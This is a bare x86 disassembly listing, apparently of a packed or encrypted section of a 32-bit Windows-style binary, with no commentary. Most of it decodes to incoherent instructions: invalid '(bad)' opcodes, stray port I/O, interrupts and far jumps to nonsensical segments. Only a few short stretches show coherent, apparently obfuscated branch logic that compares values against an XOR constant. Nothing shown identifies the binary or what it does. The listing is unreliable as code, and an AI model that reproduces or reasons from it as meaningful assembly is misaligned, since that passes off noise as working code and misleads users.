  40b51f:	cmp    cl,BYTE PTR [esi+edi*2+0x6cd05330]
  40b526:	cld    
  40b527:	and    BYTE PTR [esi+0x50],0xe1
  40b52b:	dec    esp
  40b52c:	or     cl,BYTE PTR [edi-0x32]
  40b52f:	jae    0x40b5a0
  40b531:	jno    0x40b57a
  40b533:	jmp    FWORD PTR [edi+0x41ec1d3e]
  40b539:	int3   
  40b53a:	fimul  DWORD PTR [edx]
  40b53c:	pop    ebp
  40b53d:	mov    ds:0x2917e230,eax
  40b542:	mov    eax,0x4bc5a9a1
  40b547:	sub    al,0xa8
  40b549:	adc    DWORD PTR [ebp-0x2e],ebp
  40b54c:	sysenter 
  40b54e:	mov    al,0xcb
  40b550:	push   ebx
  40b551:	pop    ds
  40b552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b553:	and    ebp,DWORD PTR [ebx+0x10077a]
  40b559:	mov    al,ds:0xb4222af2
  40b55e:	lea    esp,[edx-0x17a7781a]
  40b564:	mov    esp,0xb4a1176a
  40b569:	sub    dh,ch
  40b56b:	cld    
  40b56c:	int3   
  40b56d:	xor    BYTE PTR [edi+0xb],cl
  40b570:	(bad)  [edx+0x7d9318ef]
  40b576:	xchg   edx,eax
  40b577:	pop    esi
  40b578:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40b57a:	int    0x64
  40b57c:	test   eax,0x2cd29a9a
  40b581:	adc    BYTE PTR [edx-0xe6d7b54],dl
  40b587:	rcr    DWORD PTR es:[esi+0x50b68c77],1
  40b58e:	inc    ebx
  40b58f:	jl     0x40b5f7
  40b591:	iret   
  40b592:	fsubr  st,st(0)
  40b594:	retf   0x35d0
  40b597:	retf   0xdcd0
  40b59a:	inc    ecx
  40b59b:	xchg   esp,eax
  40b59c:	jmp    0xe773:0x48daa806
  40b5a3:	mov    ecx,0x93c4e789
  40b5a8:	mov    al,0xaa
  40b5aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5ab:	pop    ecx
  40b5ac:	nop
  40b5ad:	jecxz  0x40b55c
  40b5af:	push   0xffffffa3
  40b5b1:	fsubr  QWORD PTR [esi-0x6a]
  40b5b4:	lahf   
  40b5b5:	enter  0xa3f,0x5
  40b5b9:	mov    esp,0x23fe1c1a
  40b5be:	out    0xff,eax
  40b5c0:	sbb    al,0x30
  40b5c2:	mov    cl,0xb2
  40b5c4:	out    dx,eax
  40b5c5:	dec    edi
  40b5c6:	ds daa 
  40b5c8:	fiadd  WORD PTR [ebp+0x24]
  40b5cb:	sbb    BYTE PTR [ecx-0x80],dh
  40b5ce:	nop
  40b5cf:	sahf   
  40b5d0:	adc    eax,0x39662720
  40b5d5:	imul   edx,esi,0x20d3e078
  40b5db:	xor    eax,0xad77f976
  40b5e0:	loop   0x40b63b
  40b5e2:	pushf  
  40b5e3:	xor    DWORD PTR [edx],eax
  40b5e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5e6:	or     eax,0x2551ee3d
  40b5eb:	mov    ebx,0xed1c8d8b
  40b5f0:	mov    ah,0x2c
  40b5f2:	cmp    dh,al
  40b5f4:	gs loope 0x40b637
  40b5f7:	lahf   
  40b5f8:	and    DWORD PTR [esi*1-0x2a6a7fa3],0x77
  40b600:	fcom   QWORD PTR [esi-0x75]
  40b603:	iret   
  40b604:	hlt    
  40b605:	mov    ecx,0xb1d53f70
  40b60a:	and    al,0x60
  40b60c:	dec    ecx
  40b60d:	sub    DWORD PTR [edx],ecx
  40b60f:	arpl   WORD PTR [ebp+0x1a2c395c],dx
  40b615:	shl    edi,1
  40b617:	xchg   ecx,eax
  40b618:	jmp    0xbeb1:0x2c8bb16c
  40b61f:	pop    eax
  40b620:	cld    
  40b621:	data16 das 
  40b623:	call   0x94ea:0x1cc8f54e
  40b62a:	push   eax
  40b62b:	scas   al,BYTE PTR es:[edi]
  40b62c:	xchg   DWORD PTR [edi-0x3b],edx
  40b62f:	inc    edi
  40b630:	mov    eax,ds:0x136dbc48
  40b635:	sub    DWORD PTR [edx+ecx*4],ecx
  40b638:	jbe    0x40b62b
  40b63a:	imul   edi,DWORD PTR [ecx],0x8
  40b63d:	mov    edx,0x4ee9836
  40b642:	xchg   ah,bh
  40b644:	inc    ebp
  40b645:	mov    ebx,0xb9f712d5
  40b64a:	sti    
  40b64b:	xlat   BYTE PTR ds:[ebx]
  40b64c:	xchg   ebp,eax
  40b64d:	xchg   ebp,eax
  40b64e:	jne    0x40b5e2
  40b650:	(bad)  
  40b652:	cmp    DWORD PTR [ecx+0x66],esp
  40b655:	xor    ah,BYTE PTR [ecx+0x7f2c5cfa]
  40b65b:	adc    ch,BYTE PTR [eax+0x2d]
  40b65e:	inc    eax
  40b65f:	rol    BYTE PTR [eax+0x47],1
  40b662:	js     0x40b65f
  40b664:	jle    0x40b6a6
  40b666:	sub    eax,0xa5673977
  40b66b:	fistp  QWORD PTR [esi-0x5ecf2064]
  40b671:	xlat   BYTE PTR ds:[ebx]
  40b672:	test   DWORD PTR [eax-0x5a5330a],eax
  40b678:	adc    esp,DWORD PTR [eax-0x75]
  40b67b:	cmp    eax,0x58d8d26
  40b680:	test   esp,ebx
  40b682:	fs xor eax,0xacb038d7
  40b688:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b689:	jo     0x40b702
  40b68b:	lea    ebp,[eax-0xbf8f77e]
  40b691:	push   cs
  40b692:	test   al,0x72
  40b694:	jae    0x40b622
  40b696:	sbb    BYTE PTR [edx+0x2],ah
  40b699:	lock jmp 0x9925:0x3b6ccb84
  40b6a1:	pop    esp
  40b6a2:	adc    al,BYTE PTR [eax+0x6e]
  40b6a5:	fstp   QWORD PTR [ecx+eax*4+0x30]
  40b6a9:	pop    edx
  40b6aa:	pop    ss
  40b6ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6ac:	pushf  
  40b6ad:	pop    ds
  40b6ae:	mov    dl,0xea
  40b6b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6b1:	daa    
  40b6b2:	xchg   esi,eax
  40b6b3:	sti    
  40b6b4:	mov    ebx,0x9bdfc427
  40b6b9:	pop    esp
  40b6ba:	scas   al,BYTE PTR es:[edi]
  40b6bb:	(bad)  
  40b6bc:	fld    TBYTE PTR [ecx-0x71]
  40b6bf:	lea    eax,[edx]
  40b6c1:	std    
  40b6c2:	and    DWORD PTR [esi],0x6e83f209
  40b6c8:	fdivr  DWORD PTR [edx-0x707287b3]
  40b6ce:	int    0x7a
  40b6d0:	retf   0x72d5
  40b6d3:	and    edi,DWORD PTR [eax+0x4b6a093e]
  40b6d9:	jle    0x40b662
  40b6db:	loopne 0x40b758
  40b6dd:	jns    0x40b721
  40b6df:	adc    al,0x37
  40b6e1:	bound  ecx,QWORD PTR [ecx]
  40b6e3:	ds in  al,dx
  40b6e5:	and    edi,DWORD PTR [edx]
  40b6e7:	in     al,0xd0
  40b6e9:	das    
  40b6ea:	dec    ebx
  40b6eb:	cmp    eax,0x74fedff0
  40b6f0:	fdiv   QWORD PTR gs:[eax+0x40d219ab]
  40b6f7:	fild   QWORD PTR [eax+0x2a00997e]
  40b6fd:	push   esp
  40b6fe:	push   ebp
  40b700:	sbb    al,BYTE PTR [edx-0x4232d863]
  40b706:	(bad)  
  40b707:	and    cl,ah
  40b709:	and    al,0x6
  40b70b:	cli    
  40b70c:	add    BYTE PTR [ebp+eax*8+0x0],dl
  40b710:	(bad)  
  40b711:	cs ins BYTE PTR es:[edi],dx
  40b713:	(bad)  
  40b714:	out    dx,eax
  40b715:	pop    ss
  40b716:	pop    es
  40b717:	ret    
  40b718:	jmp    0x40b6d3
  40b71a:	je     0x40b769
  40b71c:	mov    BYTE PTR [edi-0x1b4c5d4b],bl
  40b722:	mov    bl,0x86
  40b724:	push   0x3a
  40b726:	mov    WORD PTR [edx-0x2],fs
  40b729:	repz (bad) 
  40b72b:	fidiv  WORD PTR [esi+0x22a29788]
  40b731:	ss out 0x78,al
  40b734:	call   0x8d576e0a
  40b739:	repnz sub BYTE PTR ds:0xdc63528a,dh
  40b740:	mov    ebx,DWORD PTR [edx+0x1ffbc84e]
  40b746:	scas   eax,DWORD PTR es:[edi]
  40b747:	mov    DWORD PTR ds:[edi-0x4310d0dd],edx
  40b74e:	stc    
  40b74f:	pop    esp
  40b750:	push   eax
  40b751:	mov    eax,0x63aed0b5
  40b756:	pop    esi
  40b757:	(bad)  [edx]
  40b759:	push   DWORD PTR [ebp-0x30]
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	mov    ch,0x69
  40b78c:	aam    0x64
  40b78e:	mov    dl,0xfe
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	imul   esi,DWORD PTR [edx+ebx*1+0x66],0x57
  40b79b:	pop    edx
  40b79c:	in     al,0xb8
  40b79e:	push   eax
  40b79f:	jecxz  0x40b75b
  40b7a1:	(bad)  
  40b7a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7a3:	out    0x9e,eax
  40b7a5:	stos   BYTE PTR es:[edi],al
  40b7a6:	push   0x7a625920
  40b7ab:	out    0x55,al
  40b7ad:	push   esp
  40b7ae:	pop    edi
  40b7af:	sbb    eax,DWORD PTR [ecx+0x10e25ed1]
  40b7b5:	jg     0x40b7a5
  40b7b7:	(bad)  
  40b7b8:	retf   0xb115
  40b7bb:	fcomp  DWORD PTR [edi-0x3440d867]
  40b7c1:	in     eax,dx
  40b7c2:	in     eax,dx
  40b7c3:	pop    edx
  40b7c4:	pop    ebp
  40b7c5:	(bad)  
  40b7c6:	mov    cl,0x55
  40b7c8:	popa   
  40b7c9:	loop   0x40b7a7
  40b7cb:	sub    al,cl
  40b7cd:	enter  0x92ad,0x47
  40b7d1:	cmp    al,0xa6
  40b7d3:	ror    BYTE PTR [ebp+0x33d1db9],0x67
  40b7da:	or     eax,0x26263175
  40b7df:	push   ds
  40b7e0:	sbb    al,0x9d
  40b7e2:	(bad)  
  40b7e3:	out    0xb5,eax
  40b7e5:	jmp    0x40b7fc
  40b7e7:	jmp    DWORD PTR [edx+0x53d129d6]
  40b7ed:	sbb    BYTE PTR [esi+0x44],cl
  40b7f0:	addr16 or eax,ecx
  40b7f3:	test   DWORD PTR [ebx],edx
  40b7f5:	xor    al,0x32
  40b7f7:	push   ecx
  40b7f8:	dec    edx
  40b7f9:	mov    ebx,0x87d18c85
  40b7fe:	in     eax,0xc8
  40b800:	rcr    DWORD PTR [edi-0x16],1
  40b803:	sub    esp,DWORD PTR [ecx-0x5c]
  40b806:	cwde   
  40b807:	ja     0x40b86c
  40b809:	aad    0x89
  40b80b:	in     eax,0xd3
  40b80d:	sahf   
  40b80e:	shl    BYTE PTR [esi-0x6f],0xf5
  40b812:	dec    esi
  40b813:	sub    BYTE PTR [esi-0x5ccf1e71],ch
  40b819:	pusha  
  40b81a:	in     eax,dx
  40b81b:	nop
  40b81c:	inc    ebx
  40b81d:	bound  ebp,QWORD PTR [ebp+0x17c49c34]
  40b823:	pusha  
  40b824:	cdq    
  40b825:	(bad)  
  40b827:	jmp    0x40b7bc
  40b829:	mov    eax,0xd53689cf
  40b82e:	pop    esi
  40b82f:	or     BYTE PTR [ebp+0x4e4f6004],bh
  40b835:	inc    esp
  40b836:	pop    es
  40b837:	ss jg  0x40b853
  40b83a:	mov    bl,0xa5
  40b83c:	push   edx
  40b83d:	cmp    esp,edi
  40b83f:	pop    ebx
  40b840:	mov    ecx,0x166eec16
  40b845:	mov    edi,0x170bb635
  40b84a:	pop    eax
  40b84b:	mov    bl,0x2
  40b84d:	outs   dx,BYTE PTR ds:[esi]
  40b84e:	loop   0x40b7d7
  40b850:	fdiv   DWORD PTR [edx-0x5a]
  40b853:	gs iret 
  40b855:	call   0x181b2190
  40b85a:	rcl    ah,1
  40b85c:	fsubp  st(2),st
  40b85e:	shl    DWORD PTR [ecx],1
  40b860:	sub    al,0x3d
  40b862:	imul   edx,ebx,0xffffff83
  40b865:	jns    0x40b852
  40b867:	push   es
  40b868:	push   edi
  40b869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b86a:	cmc    
  40b86b:	clc    
  40b86c:	sbb    eax,0x8e122ee9
  40b871:	popf   
  40b872:	std    
  40b873:	in     eax,0xf9
  40b875:	outs   dx,DWORD PTR cs:[esi]
  40b877:	icebp  
  40b878:	inc    edi
  40b879:	push   ecx
  40b87a:	fisttp WORD PTR [ebx-0x62]
  40b87d:	rcl    bl,1
  40b87f:	fwait
  40b880:	sahf   
  40b881:	cmp    eax,0x5b90c73e
  40b886:	mov    esi,0xe1f79342
  40b88b:	pop    edi
  40b88c:	call   0x5df1caf0
  40b891:	push   esp
  40b892:	mov    ds:0x642cbe48,eax
  40b897:	adc    DWORD PTR [esi+0x67f12542],esi
  40b89d:	stos   DWORD PTR es:[edi],eax
  40b89e:	enter  0xaf7c,0x5d
  40b8a2:	lods   eax,DWORD PTR ds:[esi]
  40b8a3:	pop    esi
  40b8a4:	bound  esp,QWORD PTR [esi+0x4f]
  40b8a7:	out    dx,eax
  40b8a8:	inc    esp
  40b8a9:	fs add eax,0xff369a37
  40b8af:	push   edi
  40b8b0:	cmp    DWORD PTR [esi],esi
  40b8b2:	aad    0x17
  40b8b4:	pusha  
  40b8b5:	test   BYTE PTR [edi+ebx*4],ah
  40b8b8:	nop
  40b8b9:	add    edx,DWORD PTR [edi-0x56e285b3]
  40b8bf:	pop    ebp
  40b8c0:	and    ch,BYTE PTR [ebx+0x439ca70b]
  40b8c6:	lods   al,BYTE PTR ds:[esi]
  40b8c7:	add    ebx,DWORD PTR [edi+0x1c]
  40b8ca:	fwait
  40b8cb:	(bad)
  40b8ce:	arpl   WORD PTR [eax+0xb],dx
  40b8d1:	dec    eax
  40b8d2:	jmp    0xed5d115c
  40b8d7:	scas   al,BYTE PTR es:[edi]
  40b8d8:	cmp    al,0x53
  40b8da:	pop    ds
  40b8db:	sbb    al,0x99
  40b8dd:	push   0x7e
  40b8df:	pop    ebx
  40b8e0:	ins    BYTE PTR es:[edi],dx
  40b8e1:	dec    esi
  40b8e2:	dec    esi
  40b8e3:	sub    eax,DWORD PTR [edx]
  40b8e5:	xchg   edx,eax
  40b8e6:	inc    edi
  40b8e7:	mov    esp,0x5854603e
  40b8ec:	mov    ebp,0x1f7390e2
  40b8f1:	loop   0x40b910
  40b8f3:	jne    0x40b877
  40b8f5:	mov    cl,0xca
  40b8f7:	mov    al,ds:0x56ef1c80
  40b8fc:	out    dx,al
  40b8fd:	aaa    
  40b8fe:	mov    ch,0xa9
  40b900:	mov    al,ds:0x5896206e
  40b905:	dec    ebp
  40b906:	mov    ebx,0x39139780
  40b90b:	aaa    
  40b90c:	push   ebp
  40b90d:	ret    
  40b90e:	sbb    DWORD PTR [ecx+0x45],edx
  40b911:	sub    ah,BYTE PTR [ebx-0x50dad290]
  40b917:	xor    al,BYTE PTR [ebx]
  40b919:	lock int3 
  40b91b:	(bad)  [ecx-0x43ba2fb1]
  40b921:	shl    dl,cl
  40b923:	psubsb mm4,QWORD PTR [ecx+0x57]
  40b927:	stos   BYTE PTR es:[edi],al
  40b928:	push   ebx
  40b929:	ret    0x5a67
  40b92c:	xchg   DWORD PTR [edx+edx*2+0x7a],ebx
  40b930:	xlat   BYTE PTR ds:[ebx]
  40b931:	sti    
  40b932:	hlt    
  40b933:	in     al,0xd4
  40b935:	dec    ebp
  40b936:	push   ecx
  40b937:	in     eax,0x7a
  40b939:	xchg   ebx,eax
  40b93a:	adc    BYTE PTR [edx+0x27ca2199],al
  40b940:	in     eax,0x4e
  40b942:	sbb    BYTE PTR [ebx+0x1900f9ef],ch
  40b948:	in     eax,0x1c
  40b94a:	cmp    BYTE PTR [edi+0x64],0xd8
  40b94e:	repz cmp al,0xa0
  40b951:	pusha  
  40b952:	nop
  40b953:	and    al,0x1c
  40b955:	inc    BYTE PTR [ecx]
  40b957:	into   
  40b958:	sbb    al,0xe3
  40b95a:	push   eax
  40b95b:	pop    edx
  40b95c:	repz iret 
  40b95e:	mov    ebx,0xb5dfcc24
  40b963:	adc    al,0x71
  40b965:	in     eax,dx
  40b966:	push   ebx
  40b967:	mov    ah,BYTE PTR [esi+0x16853bf2]
  40b96d:	pop    esp
  40b96e:	jae    0x40b936
  40b970:	lahf   
  40b971:	sahf   
  40b972:	xor    bl,BYTE PTR [ecx-0xc]
  40b975:	loopne 0x40b9ef
  40b977:	int3   
  40b978:	pcmpgtb mm5,QWORD PTR [eax-0x3b567db9]
  40b97f:	adc    DWORD PTR [ecx-0x41],0xffffffe0
  40b983:	xchg   esi,eax
  40b984:	push   es
  40b985:	(bad)  
  40b986:	mov    ebx,0x5187bdeb
  40b98b:	call   DWORD PTR [ebx-0x1f6fb615]
  40b991:	push   ds
  40b992:	xchg   edi,eax
  40b993:	mov    eax,0x436db172
  40b998:	push   0x47041717
  40b99d:	test   BYTE PTR [eax+ebx*8],bh
  40b9a0:	aaa    
  40b9a1:	jmp    0x92cd8bc0
  40b9a6:	mov    eax,ds:0x64cd8f6a
  40b9ab:	pop    ss
  40b9ac:	jg     0x40b96d
  40b9ae:	jae    0x40b9ed
  40b9b0:	xor    edx,DWORD PTR [ebx-0x7cd7359]
  40b9b6:	test   al,0x1
  40b9b8:	lock adc eax,0x522bd48f
  40b9be:	je     0x40ba3b
  40b9c0:	call   0xebf9:0x453a2b53
  40b9c7:	paddsb mm3,mm5
  40b9ca:	cmp    eax,0x8b98d69b
  40b9cf:	sbb    BYTE PTR [edx],bl
  40b9d1:	nop
  40b9d2:	mov    eax,0x441d4547
  40b9d7:	cdq    
  40b9d8:	mov    bh,0x98
  40b9da:	popf   
  40b9db:	out    0x8b,al
  40b9dd:	inc    ebp
  40b9de:	loopne 0x40ba27
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8-0x479157f8],eax
  40ba0f:	ja     0x40b9ee
  40ba11:	jl     0x40ba10
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	cmp    al,0x8b
  40ba1b:	shl    BYTE PTR [edx-0x39340dd2],cl
  40ba21:	dec    ecx
  40ba22:	jl     0x40ba80
  40ba24:	jmp    0xf3ffd357
  40ba29:	or     eax,0x4af9485
  40ba2e:	adc    eax,DWORD PTR [esi-0x1d]
  40ba31:	hlt    
  40ba32:	and    dl,bl
  40ba34:	call   FWORD PTR [esi-0x2f886543]
  40ba3a:	and    DWORD PTR [eax],edx
  40ba3c:	sar    BYTE PTR [edx],1
  40ba3e:	imul   eax,DWORD PTR [ecx+0x79],0xffb16a64
  40ba45:	(bad)  
  40ba47:	aam    0x5a
  40ba49:	mov    eax,ds:0x2167c4e3
  40ba4e:	mov    fs,WORD PTR [ebx+0x4f]
  40ba51:	xor    dh,BYTE PTR [edx]
  40ba53:	jnp    0x40ba3c
  40ba55:	xor    ecx,ecx
  40ba57:	adc    DWORD PTR ds:0xbdc944e4,eax
  40ba5d:	inc    edx
  40ba5e:	pushf  
  40ba5f:	(bad)  
  40ba60:	cmp    al,0x55
  40ba62:	cmc    
  40ba63:	sub    ebp,DWORD PTR [ecx+eax*1-0x1c]
  40ba67:	out    0x41,al
  40ba69:	je     0x40ba48
  40ba6b:	adc    dh,BYTE PTR [esi-0x19]
  40ba6e:	push   edx
  40ba6f:	inc    esp
  40ba70:	ds xchg ebx,eax
  40ba72:	push   0xe6ef30c2
  40ba77:	es out dx,al
  40ba79:	or     al,0x23
  40ba7b:	mov    ecx,0xd68d48d6
  40ba80:	xchg   ebp,eax
  40ba81:	iret   
  40ba82:	push   esi
  40ba83:	ret    0xadbd
  40ba86:	xchg   esi,eax
  40ba87:	fwait
  40ba88:	pop    esi
  40ba89:	test   BYTE PTR [edi],dl
  40ba8b:	push   ecx
  40ba8c:	sub    BYTE PTR [ebx],al
  40ba8e:	test   BYTE PTR [eax-0x53],ah
  40ba91:	gs es pop ebp
  40ba94:	std    
  40ba95:	cdq    
  40ba96:	cmp    esi,DWORD PTR [edx+eax*4]
  40ba99:	fsubr  DWORD PTR [ebp-0x7]
  40ba9c:	sub    BYTE PTR [esi-0x5653bb5d],0xae
  40baa3:	(bad)  [esi-0x7]
  40baa6:	lods   eax,DWORD PTR ds:[esi]
  40baa7:	arpl   di,ax
  40baa9:	cmp    DWORD PTR [esi-0x54d6468d],ebp
  40baaf:	aaa    
  40bab0:	ret    
  40bab1:	cmp    ah,bl
  40bab3:	mov    ch,0xd1
  40bab5:	add    ecx,DWORD PTR [ebx+0x18d3fffc]
  40babb:	pop    edi
  40babc:	mov    eax,ds:0xf594365d
  40bac1:	cs icebp 
  40bac3:	jmp    0x40ba88
  40bac5:	lfs    edx,FWORD PTR [ecx]
  40bac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bac9:	mov    ebp,0xc66a534b
  40bace:	xor    eax,0x2b84c72c
  40bad3:	faddp  st(5),st
  40bad5:	jo     0x40ba61
  40bad7:	loop   0x40bb44
  40bad9:	test   al,0x8d
  40badb:	and    esp,DWORD PTR [esi+0x60]
  40bade:	mov    cl,0xc5
  40bae0:	fwait
  40bae1:	cmp    esp,edx
  40bae3:	enter  0x1692,0xb0
  40bae7:	mov    di,0xced6
  40baeb:	dec    edx
  40baec:	(bad)  
  40baed:	jb     0x40bb19
  40baef:	or     al,0xa5
  40baf1:	push   DWORD PTR ds:0x259393b6
  40baf7:	test   eax,0x86d99212
  40bafc:	xchg   ebp,eax
  40bafd:	leave  
  40bafe:	cmp    BYTE PTR ds:0xb076be76,bh
  40bb04:	neg    DWORD PTR [edi+0x6b95ecbd]
  40bb0a:	mov    ebp,0x1cfc2c2e
  40bb0f:	in     eax,0xbd
  40bb11:	sub    al,0x79
  40bb13:	sbb    bl,0xa2
  40bb16:	xchg   edx,eax
  40bb17:	mov    esp,0xe598261c
  40bb1c:	mov    eax,0x8cdc5b41
  40bb21:	pop    es
  40bb22:	pop    esi
  40bb23:	pop    esp
  40bb24:	pop    edx
  40bb25:	shr    BYTE PTR [eax-0x67492abc],cl
  40bb2b:	out    0x97,eax
  40bb2d:	xor    DWORD PTR [esi],eax
  40bb2f:	adc    ecx,DWORD PTR [ebp-0xe8d83c3]
  40bb35:	add    DWORD PTR [edi+edi*4+0x50],ebx
  40bb39:	in     al,dx
  40bb3a:	in     al,dx
  40bb3b:	xor    DWORD PTR [ecx+0x7a8b2911],0xc89a2c
  40bb45:	mov    dh,0xca
  40bb47:	stc    
  40bb48:	stos   DWORD PTR es:[edi],eax
  40bb49:	xchg   ebp,eax
  40bb4a:	ja     0x40bade
  40bb4c:	sub    al,0x85
  40bb4e:	add    cl,dh
  40bb50:	jecxz  0x40badf
  40bb52:	jle    0x40bb59
  40bb54:	retf   
  40bb55:	aam    0x94
  40bb57:	or     edi,DWORD PTR [eax+edi*2+0x72]
  40bb5b:	in     al,dx
  40bb5c:	inc    DWORD PTR [ebp+eax*1-0x2d4befab]
  40bb63:	jmp    0x90336770
  40bb68:	hlt    
  40bb69:	pop    ebp
  40bb6a:	outs   dx,BYTE PTR ds:[esi]
  40bb6b:	pop    ss
  40bb6c:	and    dh,BYTE PTR [edx+0x48]
  40bb6f:	lock test eax,0x527277ce
  40bb75:	ins    BYTE PTR es:[edi],dx
  40bb76:	mov    ah,0x9e
  40bb78:	xor    BYTE PTR [ebx+ebx*2-0x56],ah
  40bb7c:	or     bl,ch
  40bb7e:	xchg   esp,eax
  40bb7f:	sbb    al,0xd2
  40bb81:	gs add al,0x7c
  40bb84:	sub    ecx,DWORD PTR [ebx]
  40bb86:	pop    ecx
  40bb87:	test   ebp,edi
  40bb89:	sbb    eax,0xbdaa4c7f
  40bb8e:	lea    esp,[edx]
  40bb90:	mov    ebp,0x7dbd2f04
  40bb95:	jecxz  0x40bb85
  40bb97:	xchg   ebp,eax
  40bb98:	stos   DWORD PTR es:[edi],eax
  40bb99:	test   dl,bl
  40bb9b:	ja     0x40bb48
  40bb9d:	mov    esi,DWORD PTR ds:0x437835cf
  40bba3:	pop    ebx
  40bba4:	adc    DWORD PTR [edx+0x4f],ecx
  40bba7:	je     0x40bb68
  40bba9:	push   es
  40bbaa:	pop    es
  40bbab:	xchg   BYTE PTR [esi],cl
  40bbad:	push   ss
  40bbae:	fdivr  DWORD PTR [esi]
  40bbb0:	xchg   BYTE PTR [edx-0x35],dl
  40bbb3:	sub    ah,BYTE PTR [edi-0x60]
  40bbb6:	loopne 0x40bbe1
  40bbb8:	iret   
  40bbb9:	sub    eax,0x52ae6227
  40bbbe:	mov    dl,0x6d
  40bbc0:	leave  
  40bbc1:	inc    ebx
  40bbc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbc3:	call   0xa0ba09d7
  40bbc8:	adc    ecx,DWORD PTR [ecx-0x48a6f3be]
  40bbce:	push   edi
  40bbcf:	push   cs
  40bbd0:	xor    cl,0x63
  40bbd3:	mov    al,ds:0x4bd9d7d9
  40bbd8:	sar    BYTE PTR [esi+0x3fd86f50],0x6a
  40bbdf:	int    0xf5
  40bbe1:	sbb    al,0x98
  40bbe3:	sahf   
  40bbe4:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbe6:	mov    esi,0x1c5ce7b5
  40bbeb:	mov    ebp,0xea13bcad
  40bbf0:	dec    edx
  40bbf1:	jae    0x40bbae
  40bbf3:	jmp    0x25:0x838cfcd4
  40bbfa:	sbb    cl,BYTE PTR [ebx+edx*2-0x43]
  40bbfe:	mov    BYTE PTR [edi-0x21b781eb],dh
  40bc04:	outs   dx,DWORD PTR ds:[esi]
  40bc05:	jno    0x40bc6f
  40bc07:	sbb    eax,0x4b2a13fc
  40bc0c:	out    dx,eax
  40bc0d:	mov    ss,WORD PTR [edi]
  40bc0f:	adc    eax,0xd2b470b8
  40bc14:	mov    bl,0x53
  40bc16:	pop    esp
  40bc17:	push   edx
  40bc18:	and    DWORD PTR ds:0x76da0458,edx
  40bc1e:	xchg   edx,eax
  40bc1f:	pop    ecx
  40bc20:	aaa    
  40bc21:	aam    0x4
  40bc23:	aas    
  40bc24:	dec    ecx
  40bc25:	in     eax,dx
  40bc26:	pop    es
  40bc27:	push   eax
  40bc28:	adc    al,0x27
  40bc2a:	inc    eax
  40bc2b:	dec    edi
  40bc2c:	and    al,0x70
  40bc2e:	xchg   edi,eax
  40bc2f:	in     eax,0x1f
  40bc31:	stos   BYTE PTR es:[edi],al
  40bc32:	scas   eax,DWORD PTR es:[edi]
  40bc33:	cmp    eax,0xe96566a8
  40bc38:	jo     0x40bc87
  40bc3a:	je     0x40bc06
  40bc3c:	sbb    BYTE PTR [ebx+0x69b8423d],ch
  40bc42:	inc    ebp
  40bc43:	or     esp,DWORD PTR [ecx+0x1f]
  40bc46:	dec    edi
  40bc47:	mov    al,ds:0xc5929eeb
  40bc4c:	sub    BYTE PTR [ecx+0x5e],cl
  40bc4f:	sti    
  40bc50:	mov    DWORD PTR ds:0xea2017d0,esi
  40bc56:	push   ss
  40bc57:	retf   0x7f3c
  40bc5a:	jmp    0xb70f:0x36dd0993
  40bc61:	add    al,0x78
  40bc63:	mov    ecx,DWORD PTR [ebp-0x14]
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc96:	pop    ebp
  40bc97:	push   cs
  40bc98:	rol    esi,cl
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	mov    ds:0x663f1017,al
  40bca6:	shl    DWORD PTR [ebp+0x15],cl
  40bca9:	push   cs
  40bcaa:	adc    eax,DWORD PTR ds:0x9a200e11
  40bcb0:	mov    al,0x87
  40bcb2:	das    
  40bcb3:	repnz push eax
  40bcb5:	aaa    
  40bcb6:	dec    ecx
  40bcb7:	data16 out 0x28,al
  40bcba:	push   edi
  40bcbb:	in     eax,0x65
  40bcbd:	adc    esi,DWORD PTR [ebx-0x7164c3fe]
